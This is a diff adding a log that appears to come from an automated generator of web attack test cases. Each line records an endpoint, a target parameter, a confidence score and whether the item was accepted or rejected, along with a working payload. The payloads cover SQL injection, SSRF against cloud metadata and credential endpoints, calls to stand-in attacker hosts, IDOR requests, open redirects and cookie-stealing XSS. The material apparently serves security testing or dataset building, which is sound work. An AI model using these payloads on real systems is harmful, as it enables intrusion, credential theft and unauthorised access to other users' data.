@@ -1,0 +1,201 @@
+OK    sqli_0             GET /catalog/item/detail?sku=AX-1043       param=sku                conf=0.90 payload='
+OK    sqli_0             POST /api/ratings/summary                  param=product_ref        conf=0.70 payload=conv('a',16,2)=conv('a',16,2)
+OK    sqli_0             GET /account/history?filter=purchases      param=filter             conf=0.85 payload=1 AND SLEEP(5)
+REJECT sqli_0 | duplicate (target_param,payload) | payload='
+OK    sqli_0             GET /support/ticket?category=hardware      param=category           conf=0.75 payload=conv('a',16,2)=conv('a',16,2)
+OK    sqli_1             GET /api/v2/telemetry/events               param=since              conf=0.90 payload=1 AND 1337=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000
+OK    sqli_1             POST /api/v1/warehouse/stock/search        param=warehouse_code     conf=0.86 payload=1 AND 1337=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000
+OK    sqli_1             GET /storefront/catalog/item               param=sku                conf=0.88 payload=1 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version(
+OK    sqli_1             GET /checkout/basket/summary               param=cart_id            conf=0.72 payload=1 AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version(
+OK    sqli_1             GET /api/v1/analytics/report               param=X-Report-Filter    conf=0.80 payload=1 AND 1337=CAST('~'||(SELECT version())::text||'~' AS N
+REJECT sqli_2 | duplicate (target_param,payload) | payload=1 ORDER BY 4-- 
+REJECT sqli_2 | duplicate (target_param,payload) | payload=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(12
+REJECT sqli_2 | duplicate (target_param,payload) | payload=' or 1=1 limit 1 --
+OK    sqli_2             GET /dashboard                             param=sort_col (cookie)  conf=0.78 payload=1 ORDER BY 4-- 
+OK    sqli_2             POST /api/transfer                         param=account_id         conf=0.72 payload=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CH
+OK    sqli_3             POST /api/v1/auth/login                    param=login              conf=0.88 payload=admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089
+OK    sqli_3             GET /account/recovery/verify               param=email              conf=0.82 payload=admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089
+OK    sqli_3             GET /admin/console                         param=uid                conf=0.78 payload=admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089
+OK    sqli_3             GET /search/orders?orderId=1               param=orderId            conf=0.70 payload=1 AND 1=1--sp_password
+OK    sqli_3             GET /api/v1/customers/{customerRef}        param=customerRef        conf=0.66 payload=1 AND 1=1--sp_password
+OK    sqli_4             POST /intranet/getNoticeBoard              param=res_id (form body) conf=0.90 payload=res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(
+OK    sqli_4             GET /shop/voucher/validate?voucher=SAVE2   param=voucher (query str conf=0.90 payload=') OR ('1'='1
+OK    sqli_4             GET /archive/documents?cols=name           param=cols (query string conf=0.85 payload=' FROM filelist ORDER BY filename collate nocase asc
+OK    sqli_4             GET /admin/audit/log                       param=branch (Cookie hea conf=0.80 payload=') OR ('1'='1
+OK    sqli_4             GET /api/vault/documents/export            param=X-Fields (request  conf=0.70 payload=' FROM filelist ORDER BY filename collate nocase asc
+OK    sqli_5             GET /reports/sales/summary                 param=period             conf=0.82 payload=0'>'1
+OK    sqli_5             GET /api/v2/inventory/stock                param=X-Store-Id         conf=0.86 payload=1' WAITFOR DELAY '0:0:10
+OK    sqli_5             POST /search/advanced                      param=query              conf=0.90 payload=-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c
+OK    sqli_5             GET /account/preferences                   param=layout             conf=0.72 payload=0'>'1
+OK    sqli_5             GET /store/product/{sku}                   param=sku                conf=0.78 payload=-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c
+OK    sqli_6             GET /catalog/filter                        param=category           conf=0.90 payload=1 AND SELECT SUBSTR(table_name,1,1) FROM information_sc
+OK    sqli_6             GET /orders/lookup                         param=order_id           conf=0.85 payload=1'%2buser_name(@@version)--
+REJECT sqli_6 | PAYLOAD NOT IN WHITELIST | payload=1+and+1=(select+x+from+OpenRowset(BULK+'C:/Windows/win.ini',
+OK    sqli_6             GET /api/v2/products                       param=sort               conf=0.88 payload=1 AND SELECT SUBSTR(table_name,1,1) FROM information_sc
+OK    sqli_6             POST /admin/report/generate                param=report_id          conf=0.80 payload=1'%2buser_name(@@version)--
+OK    sqli_7             GET /internal/metrics/healthcheck          param=X-Request-Source   conf=0.82 payload=SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_R
+OK    sqli_7             GET /api/v1/inventory/snapshot             param=warehouse          conf=0.86 payload=SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_R
+OK    sqli_7             GET /store/checkout                        param=cart_ref           conf=0.88 payload=SELECT $$hacktricks$$
+OK    sqli_7             POST /api/v3/orders/lookup                 param=order_id           conf=0.90 payload=-1' or 1337.1337e1 or '1'='1
+OK    sqli_7             GET /store/p/25/reviews                    param=product_id         conf=0.66 payload=-1' or 1337.1337e1 or '1'='1
+OK    ssrf_0             POST /v1/link/preview                      param=target_url         conf=0.90 payload=http://127.0.0.1:80
+OK    ssrf_0             GET /webhooks/test                         param=callback           conf=0.85 payload=http://2130706433/
+OK    ssrf_0             POST /functions/debug/invoke               param=probe_url          conf=0.92 payload=http://localhost:9001/2018-06-01/runtime/invocation/nex
+OK    ssrf_0             GET /import/screenshot                     param=page               conf=0.70 payload=http://2130706433/
+OK    ssrf_0             GET /integrations/healthcheck              param=upstream           conf=0.88 payload=http://localhost:9001/2018-06-01/runtime/invocation/nex
+OK    ssrf_1             POST /api/v1/media/proxy                   param=image_url          conf=0.87 payload=http://169.254.169.254/latest/meta-data/
+OK    ssrf_1             GET /webhooks/validate                     param=callback           conf=0.72 payload=http://2852039166/latest/meta-data/
+OK    ssrf_1             POST /integrations/webhook/test            param=webhook_url        conf=0.66 payload=http://[::ffff:a9fe:a9fe]/latest/meta-data/
+OK    ssrf_1             GET /cdn/thumbnail/{source}                param=source             conf=0.80 payload=http://169.254.169.254/latest/meta-data/
+OK    ssrf_1             GET /api/v2/preview                        param=X-Resource-Locatio conf=0.60 payload=http://[::ffff:a9fe:a9fe]/latest/meta-data/
+OK    ssrf_2             GET /internal/fetch-resource               param=resource_url       conf=0.90 payload=http://169.254.170.2/v2/credentials/
+OK    ssrf_2             POST /api/v2/proxy                         param=target             conf=0.85 payload=http://169.254.170.2/v2/credentials/
+OK    ssrf_2             GET /api/link-preview                      param=href               conf=0.80 payload=gopher://metadata.google.internal:80/xGET%20/computeMet
+OK    ssrf_2             POST /render/fetch                         param=source_url         conf=0.72 payload=gopher://metadata.google.internal:80/xGET%20/computeMet
+OK    ssrf_2             GET /api/v1/healthcheck/upstream           param=upstream_url       conf=0.82 payload=http://169.254.169.254/hetzner/v1/metadata
+OK    ssrf_3             POST /api/v2/media/render                  param=source_url         conf=0.82 payload=sftp://ATTACKER_SERVER:11111/
+REJECT ssrf_3 | duplicate (target_param,payload) | payload=gopher://127.0.0.1:6379/_%0D%0ACONFIG%20SET%20dir%20/var/www
+OK    ssrf_3             POST /webhooks/deliver                     param=payload_url        conf=0.87 payload=make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+OK    ssrf_3             GET /dashboard/widgets/preview             param=widget_src         conf=0.61 payload=sftp://ATTACKER_SERVER:11111/
+OK    ssrf_3             GET /render/{remote_host}/{asset_path}     param=remote_host        conf=0.79 payload=make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+OK    ssrf_4             POST /api/integrations/webhooks            param=webhook_url        conf=0.92 payload=http://BURP-COLLABORATOR-SUBDOMAIN
+OK    ssrf_4             GET /internal-proxy/fetch                  param=resource           conf=0.88 payload=http://127.0.0.1/%2561dmin
+OK    ssrf_4             POST /ingest/<project>/store/              param=filename (Sentry s conf=0.87 payload={"exception":{"values":[{"stacktrace":{"frames":[{"file
+OK    ssrf_4             GET /render/preview                        param=X-Preview-Source ( conf=0.85 payload=http://BURP-COLLABORATOR-SUBDOMAIN
+OK    ssrf_4             GET /legacyproxy/{url}                     param=url (path remainde conf=0.80 payload=http://BURP-COLLABORATOR-SUBDOMAIN
+REJECT ssrf_5 | duplicate (target_param,payload) | payload=autodiscover/autodiscover.json@outlook.com
+REJECT ssrf_5 | duplicate (target_param,payload) | payload=autodiscover/autodiscover.json@outlook.com
+OK    ssrf_5             POST /api/v4/projects/import               param=url                conf=0.85 payload=http://user@google.com/.proxy=http://ATTACKER_SERVER:85
+REJECT ssrf_5 | duplicate (target_param,payload) | payload=http://user@google.com/.proxy=http://ATTACKER_SERVER:8500
+OK    ssrf_5             POST /api/v2/integrations/webhook/test     param=callback_url       conf=0.75 payload=gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%
+OK    ssrf_6             POST /api/compile-theme                    param=stylesheet         conf=0.88 payload=@import (inline) 'http://ATTACKER/payload.less';
+REJECT ssrf_6 | duplicate (target_param,payload) | payload=http://ATTACKER/start (chain: 302 -> 305..309 loop -> 302 to
+REJECT ssrf_6 | duplicate (target_param,payload) | payload=GET @evildomain.com/ HTTP/1.1
+OK    ssrf_6             POST /admin/render                         param=less_source        conf=0.90 payload=@import (inline) 'http://ATTACKER/payload.less';
+OK    ssrf_6             GET /proxy/resource                        param=resource           conf=0.72 payload=GET @evildomain.com/ HTTP/1.1
+OK    ssrf_6             GET /api/webhook-test                      param=callback_url       conf=0.68 payload=http://ATTACKER/start (chain: 302 -> 305..309 loop -> 3
+OK    ssrf_7             POST /api/v2/media/import                  param=source_url         conf=0.88 payload=http://[0:0:0:0:0:ffff:127.0.0.1]/
+OK    ssrf_7             POST /api/render/screenshot                param=X-Fetch-Url        conf=0.79 payload=https:attacker.com
+REJECT ssrf_7 | duplicate (target_param,payload) | payload=https://{domain}.attacker.com
+OK    ssrf_7             GET /portal/links/unfurl                   param=preview_url        conf=0.67 payload=https:attacker.com
+OK    ssrf_7             GET /cdn/screenshot/{*source}              param=source             conf=0.72 payload=http://[0:0:0:0:0:ffff:127.0.0.1]/
+REJECT idor_0 | duplicate (target_param,payload) | payload=user_id=124
+REJECT idor_0 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=user_id=124
+REJECT idor_0 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=/api/invoices/100235
+REJECT idor_0 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=0x4642e
+REJECT idor_0 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=user_id=124
+REJECT idor_1 | duplicate (target_param,payload) | payload=email=janet.doe@mail.com
+REJECT idor_1 | duplicate (target_param,payload) | payload=id=dXNlcjI=
+REJECT idor_1 | duplicate (target_param,payload) | payload=5ae9b90a2c144b9def01ec38
+REJECT idor_1 | duplicate (target_param,payload) | payload=email=janet.doe@mail.com
+OK    idor_1             GET /api/v1/documents?docId=5ae9b90a2c14   param=docId              conf=0.76 payload=5ae9b90a2c144b9def01ec38
+REJECT idor_2 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=h=83878c91171338902e0fe0fb97a8c47a
+REJECT idor_2 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=_
+REJECT idor_2 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=Content-Type: application/json with body {"record":{"id":19}
+REJECT idor_2 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=Content-Type: application/json with body {"record":{"id":19}
+REJECT idor_2 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=h=83878c91171338902e0fe0fb97a8c47a
+REJECT idor_3 | duplicate (target_param,payload) | payload=user_id=19&user_id=21
+OK    idor_3             DELETE /api/v1/messages/697412             param=messageId (path se conf=0.77 payload=DELETE /api/messages/697413
+REJECT idor_3 | duplicate (target_param,payload) | payload=account_id=1002
+REJECT idor_3 | duplicate (target_param,payload) | payload=user_id=19&user_id=21
+REJECT idor_3 | duplicate (target_param,payload) | payload=account_id=1002
+REJECT idor_4 | duplicate (target_param,payload) | payload=user_id=123&user_id=124 (duplicate param)
+OK    idor_4             GET /ops/exports/usage-report?user_id=10   param=user_id (occurrenc conf=0.60 payload=user_id=123&user_id=124 (duplicate param)
+OK    idor_4             POST /api/graphql (persisted operation)    param=subredditName (Gra conf=0.82 payload={"id":"<persisted-query-id>","variables":{"subredditNam
+OK    idor_4             POST /orion/graphql (mobile app promoted   param=variables.subreddi conf=0.78 payload={"id":"<persisted-query-id>","variables":{"subredditNam
+OK    idor_4             DELETE /api/v1/messages/<message_id>/      param=message_id (path s conf=0.86 payload=DELETE /api/v1/messages/4423007/ with attacker session 
+REJECT idor_5 | duplicate (target_param,payload) | payload={"operationName":"DeleteStorySnaps","variables":{"ids":["VIC
+OK    idor_5             POST /api/v2/graphql                       param=variables.ids      conf=0.82 payload={"operationName":"DeleteStorySnaps","variables":{"ids":
+OK    idor_5             POST /api/v1/notes                         param=target_type, targe conf=0.88 payload=?target_id=VICTIM_SNIPPETID&target_type=personal_snippe
+REJECT idor_5 | duplicate (target_param,payload) | payload=?target_id=VICTIM_SNIPPETID&target_type=personal_snippet
+REJECT idor_5 | duplicate (target_param,payload) | payload=Cookie: selectedAddressId=<TARGET_ID> with matching delivery
+REJECT idor_6 | duplicate (target_param,payload) | payload=email_address=attacker@example.com&username=victim_username
+REJECT idor_6 | duplicate (target_param,payload) | payload=text_query=1&organization_id=58579&persist=true&sort_type=pg
+OK    idor_6             POST /graphql                              param=variables.organiza conf=0.82 payload={"invitation":{"email":"attacker@example.com","role":"a
+REJECT idor_6 | duplicate (target_param,payload) | payload=email_address=attacker@example.com&username=victim_username
+REJECT idor_6 | duplicate (target_param,payload) | payload=text_query=1&organization_id=58579&persist=true&sort_type=pg
+OK    idor_7             GET /api/v2/accounts/1233                  param=account_id (path s conf=0.87 payload=/api/user/1233
+OK    idor_7             GET /api/orders/1233/attachments           param=order_id (path seg conf=0.81 payload=/api/user/1233
+OK    idor_7             GET /api/v1/tenants/1233/members           param=tenantId (path seg conf=0.76 payload=/api/user/1233
+OK    idor_7             GET /api/billing/invoice?invoice=2024-00   param=invoice (query)    conf=0.84 payload=invoice=2024-00002
+OK    idor_7             GET /api/v1/campaigns/metrics              param=X-Client-ID (heade conf=0.72 payload=X-Client-ID: 4712
+OK    open_redirect_0    GET /auth/callback                         param=landing            conf=0.90 payload=https://evil.com
+OK    open_redirect_0    POST /account/preferences                  param=return_to          conf=0.72 payload=\/\/evil.com/
+OK    open_redirect_0    GET /session/resume                        param=return_dest        conf=0.68 payload=http://www.trusted.com@evil.com/
+OK    open_redirect_0    GET /affiliate/out                         param=X-Exit-Url         conf=0.66 payload=http://www.trusted.com@evil.com/
+OK    open_redirect_0    GET /redirect/*                            param=redirect_target    conf=0.60 payload=https://evil.com
+OK    open_redirect_1    GET /auth/callback                         param=redirect_uri       conf=0.85 payload=http://www.trusted.com.google.com
+OK    open_redirect_1    POST /session/terminate                    param=return_to          conf=0.70 payload=http://evil.com?http://www.trusted.com/
+OK    open_redirect_1    GET /sso/authorize                         param=continue           conf=0.65 payload=%2f%2fevil.com
+REJECT open_redirect_1 | duplicate (target_param,payload) | payload=%2f%2fevil.com
+OK    open_redirect_1    GET /portal/launch                         param=post_login_redirec conf=0.75 payload=http://www.trusted.com.google.com
+OK    open_redirect_2    GET /account/continue                      param=return_to          conf=0.88 payload=/%09/evil.com
+OK    open_redirect_2    POST /auth/callback/resolve                param=dest               conf=0.82 payload=?url=https://evil.com&next=https://evil.com&redirect=ht
+OK    open_redirect_2    GET /news/share?link=                      param=link               conf=0.90 payload=javascript:alert(1)
+OK    open_redirect_2    GET /sso/redirect?to=                      param=to                 conf=0.86 payload=/%09/evil.com
+OK    open_redirect_2    GET /logout?next=                          param=next               conf=0.78 payload=?url=https://evil.com&next=https://evil.com&redirect=ht
+REJECT open_redirect_3 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074
+REJECT open_redirect_3 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=http://a.com／X.evil.com
+REJECT open_redirect_3 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=http://[::ffff:216.58.214.206]
+REJECT open_redirect_3 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'payload', 'injection_point', 'expect | payload=http://[::ffff:216.58.214.206]
+REJECT open_redirect_3 | keys mismatch: ['endpoint', 'target_param', 'injection_point', 'recon_evidence', 'planner_rationale', 'payload', 'expect | payload=http://a.com／X.evil.com
+OK    open_redirect_4    GET /auth/post_login                       param=return             conf=0.85 payload=https:///evil.com/%2e%2e
+OK    open_redirect_4    GET /r/track_click                         param=dest               conf=0.78 payload=https:///evil.com/%2e%2e
+REJECT open_redirect_4 | duplicate (target_param,payload) | payload=unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt
+REJECT open_redirect_4 | duplicate (target_param,payload) | payload=unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt
+REJECT open_redirect_4 | duplicate (target_param,payload) | payload=recipient=/example.com
+REJECT open_redirect_5 | duplicate (target_param,payload) | payload=scope=a&redirect_uri=https://evil.com/abc
+REJECT open_redirect_5 | duplicate (target_param,payload) | payload=prejoin_data=domain%2Fevil.com/?=
+REJECT open_redirect_5 | duplicate (target_param,payload) | payload=http://2130706433/
+REJECT open_redirect_5 | duplicate (target_param,payload) | payload=scope=a&redirect_uri=https://evil.com/abc
+OK    open_redirect_5    GET /session/refresh                       param=return_to          conf=0.64 payload=http://2130706433/
+OK    open_redirect_6    GET /oauth/authorize                       param=redirect_uri       conf=0.90 payload=http://LOCALHOST./
+REJECT open_redirect_6 | duplicate (target_param,payload) | payload=https://trusted.example@evil.example/
+OK    open_redirect_6    GET /out/link                              param=target             conf=0.88 payload=https://trusted.example.evil.example/
+OK    open_redirect_6    GET /sso/return                            param=Referer            conf=0.72 payload=http://LOCALHOST./
+OK    open_redirect_6    GET /shop/checkout/return                  param=post_login_url     conf=0.83 payload=https://trusted.example@evil.example/
+OK    open_redirect_7    GET /redirect/http://evil.example          param=path (tail after / conf=0.86 payload=/redirect/http://evil.example
+OK    open_redirect_7    GET /auth/mfa/verify                       param=next               conf=0.80 payload=/redirect/http://evil.example
+OK    open_redirect_7    GET /billing/portal/return                 param=relay              conf=0.78 payload=https://app.example.com/logout?next=//evil.example
+OK    open_redirect_7    GET /markdown/preview                      param=src                conf=0.70 payload=javascript://whitelisted.com?%a0alert%281%29
+OK    open_redirect_7    GET /portal/entry                          param=X-Original-URL     conf=0.57 payload=https://app.example.com/logout?next=//evil.example
+OK    xss_reflected_0    GET /products/view?name=wireless+mouse     param=name               conf=0.85 payload=<script>alert(1)</script>
+OK    xss_reflected_0    POST /newsletter/subscribe                 param=email              conf=0.80 payload=<img src=x onerror=alert(1)>
+OK    xss_reflected_0    GET /profiles/lookup?handle=team_alpha     param=handle             conf=0.70 payload=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+OK    xss_reflected_0    GET /blog/preview?draft=hello+world        param=draft              conf=0.75 payload=<script>alert(1)</script>
+REJECT xss_reflected_0 | keys mismatch: ['endpoint', 'target_param', 'recon_evidence', 'planner_rationale', 'vuln_class', 'payload', 'injectiaon_ | payload=<img src=x onerror=alert(1)>
+OK    xss_reflected_1    POST /api/v2/feedback/submit               param=comment            conf=0.86 payload=<scr<script>ipt>alert(1)</scr</script>ipt>
+OK    xss_reflected_1    GET /user/profile                          param=display_name       conf=0.90 payload=<svg/onload=alert(1)>
+OK    xss_reflected_1    GET /store/search                          param=ref                conf=0.78 payload=<svg/onload=alert``>
+OK    xss_reflected_1    GET /u/{username}                          param=username           conf=0.68 payload=<scr<script>ipt>alert(1)</scr</script>ipt>
+OK    xss_reflected_1    GET /dashboard                             param=X-Return-To        conf=0.82 payload=<svg/onload=alert(1)>
+OK    xss_reflected_2    GET /search                                param=q                  conf=0.90 payload=" autofocus onfocus=alert(document.domain) x="
+OK    xss_reflected_2    GET /feedback                              param=ticket             conf=0.82 payload=" onfocus=alert(1) id=x tabindex=0 style=display:block>
+REJECT xss_reflected_2 | duplicate (target_param,payload) | payload=javascript:alert(1)
+OK    xss_reflected_2    POST /newsletter/confirm                   param=subscriber_token   conf=0.86 payload=" autofocus onfocus=alert(document.domain) x="
+OK    xss_reflected_2    GET /account/prefs                         param=theme (Cookie)     conf=0.74 payload=" onfocus=alert(1) id=x tabindex=0 style=display:block>
+OK    xss_reflected_3    GET /auth/sso/continue                     param=return_to          conf=0.82 payload=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L
+REJECT xss_reflected_3 | PAYLOAD NOT IN WHITELIST | payload=" popover id="x" onbeforetoggle="alert(1)"
+OK    xss_reflected_3    GET /dashboard                             param=ui_theme           conf=0.63 payload=" accesskey="X" onclick="alert(1)" x="
+REJECT xss_reflected_3 | PAYLOAD NOT IN WHITELIST | payload=" popover id="x" onbeforetoggle="alert(1)"
+OK    xss_reflected_3    GET /docs/{version}/redir                  param=version            conf=0.71 payload=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L
+OK    xss_reflected_4    GET /catalog/search?kw=tshirt              param=kw                 conf=0.85 payload=&apos;-alert(1)-&apos;
+OK    xss_reflected_4    POST /newsletter/subscribe                 param=email              conf=0.70 payload=&apos;-alert(1)-&apos;
+OK    xss_reflected_4    GET /outbox/preview?link=https://example   param=link               conf=0.80 payload=<a href="jav&#x61script:alert(3)">a</a>
+OK    xss_reflected_4    POST /reviews/render                       param=snippet            conf=0.72 payload=<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
+OK    xss_reflected_4    GET /ui/theme/preview                      param=X-Client-Theme     conf=0.60 payload=<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
+OK    xss_reflected_5    GET /account/welcome?displayName=bob       param=displayName        conf=0.90 payload=</script><img src=1 onerror=alert(document.domain)>
+OK    xss_reflected_5    POST /api/v1/comments                      param=body               conf=0.82 payload=';alert(document.domain)//
+REJECT xss_reflected_5 | PAYLOAD NOT IN WHITELIST | payload=test";alert(1);a=""
+OK    xss_reflected_5    GET /preferences/render                    param=ui_lang            conf=0.66 payload=</script><img src=1 onerror=alert(document.domain)>
+OK    xss_reflected_5    GET /docs/{slug}/view                      param=slug               conf=0.58 payload=';alert(document.domain)//
+OK    xss_reflected_6    GET /search                                param=q                  conf=0.90 payload=${alert(1)}
+OK    xss_reflected_6    GET /profile/welcome                       param=firstname          conf=0.75 payload=;`${`${`${`${alert(1)}`}`}`}`
+OK    xss_reflected_6    POST /feedback/preview                     param=comment            conf=0.82 payload=\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('PHNj
+OK    xss_reflected_6    GET /docs/view                             param=doc                conf=0.70 payload=\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('PHNj
+OK    xss_reflected_6    GET /greet                                 param=msg                conf=0.65 payload=;`${`${`${`${alert(1)}`}`}`}`
+OK    xss_reflected_7    GET /promo/landing                         param=utm_content        conf=0.90 payload=alert`1`
+OK    xss_reflected_7    POST /api/v2/products/4411/reviews         param=reviewBody         conf=0.86 payload=Reflect.apply.call`${alert}${window}${[1337]}`
+OK    xss_reflected_7    GET /dashboard/panel                       param=X-Debug-Trace      conf=0.78 payload=window.onerror=eval;throw"=alert\x281\x29"
+OK    xss_reflected_7    POST /cart/checkout                        param=cart_session       conf=0.74 payload=alert`1`
+OK    xss_reflected_7    GET /reports/2026/q1/summary               param=segment            conf=0.63 payload=Reflect.apply.call`${alert}${window}${[1337]}`
